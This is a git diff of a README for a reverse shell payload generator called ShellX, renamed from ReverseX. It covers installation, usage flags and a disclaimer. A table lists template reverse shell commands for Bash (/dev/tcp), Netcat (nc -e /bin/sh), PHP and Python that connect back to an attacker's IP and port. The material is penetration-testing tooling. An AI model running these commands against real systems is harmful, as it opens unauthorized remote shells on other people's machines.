@@ -1,14 +1,42 @@
-# REVERSEX — Reverse Shell & Payload Generator
+<div align="center">
+
+```text
+███████╗██╗  ██╗███████╗██╗     ██╗  ██╗
+██╔════╝██║  ██║██╔════╝██║     ██║  ██║
+███████╗███████║█████╗  ██║     ███████║
+╚════██║██╔══██║██╔══╝  ██║     ██╔══██║
+███████║██║  ██║███████╗███████╗██║  ██║
+╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
+```
+
+# ShellX — Reverse Shell & Payload Generator
 
 **Generate ready-to-use reverse shell payloads for Bash, Python, PHP, and Netcat.**
 
-Part of the **AdhiHub** security toolkit.
+**Author:** Adhithya J (AdhiHub)  
+**Version:** 1.0  
+**Type:** Payload Generator  
+**Language:** Bash  
+**License:** MIT
+
+</div>
+
+---
+
+## ⚠️ Disclaimer
+
+```text
+[!] FOR EDUCATIONAL PURPOSES ONLY
+[!] Use at your own risk. Developer assumes NO liability.
+[!] Only use on systems you own or have explicit permission to test.
+[!] Unauthorized access to computer systems is a crime.
+```
 
 ---
 
 ## What It Does
 
-Give it your IP (LHOST) and port (LPORT), and ReverseX spits out a ready-to-copy-paste reverse shell command for:
+Give it your IP (LHOST) and port (LPORT), and ShellX spits out a ready-to-copy-paste reverse shell command for:
 
 | Payload Type | What You Get |
 |-------------|-------------|
@@ -22,50 +50,50 @@ It also shows you the **listener command** to run on your machine (`nc -lvnp <po
 
 ---
 
-## One-Line Install
+## Installation
+
+### One-liner
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/AdhiHub/reversex/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/AdhiHub/ShellX/main/install.sh | bash
 ```
 
-After install:
+After install, just type:
 
 ```bash
-reversex
+shellx
+```
+
+### Manual
+
+```bash
+git clone https://github.com/AdhiHub/ShellX.git
+cd ShellX
+chmod +x shellx.sh
+./shellx.sh
 ```
 
 ---
 
-## How to Use
+## Usage
 
-### Method 1: Interactive Menu
+### Interactive Menu
 
 ```bash
-reversex
+shellx
 ```
 
 Enter your IP and port when prompted, pick a payload type.
 
-### Method 2: Command Line
+### Command Line (Flags)
 
 ```bash
-# Bash reverse shell
-reversex -bash 10.0.0.5 4444
-
-# Python reverse shell
-reversex -python 10.0.0.5 4444
-
-# PHP reverse shell
-reversex -php 10.0.0.5 4444
-
-# Netcat reverse shell
-reversex -nc 10.0.0.5 4444
-
-# All payloads at once
-reversex -all 10.0.0.5 4444
-
-# Help
-reversex -h
+shellx -bash   10.0.0.5 4444   # Bash reverse shell
+shellx -python 10.0.0.5 4444   # Python reverse shell
+shellx -php    10.0.0.5 4444   # PHP reverse shell
+shellx -nc     10.0.0.5 4444   # Netcat reverse shell
+shellx -all    10.0.0.5 4444   # All payloads
+shellx -h                       # Help
 ```
 
 ---
@@ -97,19 +125,15 @@ LPORT: 4444
 
 ---
 
-## Run Without Installing
+## Payloads Generated
 
-```bash
-git clone https://github.com/AdhiHub/reversex.git
-cd reversex
-chmod +x reversex.sh
-./reversex.sh
-```
+| Type | Command |
+|------|---------|
+| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
+| Python | `python3 -c 'import socket...'` |
+| PHP | `php -r '$sock=fsockopen("IP",PORT)...'` |
+| Netcat | `nc -e /bin/sh IP PORT` |
 
 ---
 
-> **⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY**
->
-> Use at your own risk. Developer(s) assume NO liability.
-> Only use on systems you own or have explicit written permission to test.
-> Unauthorized access to computer systems is a crime.
+<p align="center">© 2026 Adhithya J · Built with passion on Linux</p>
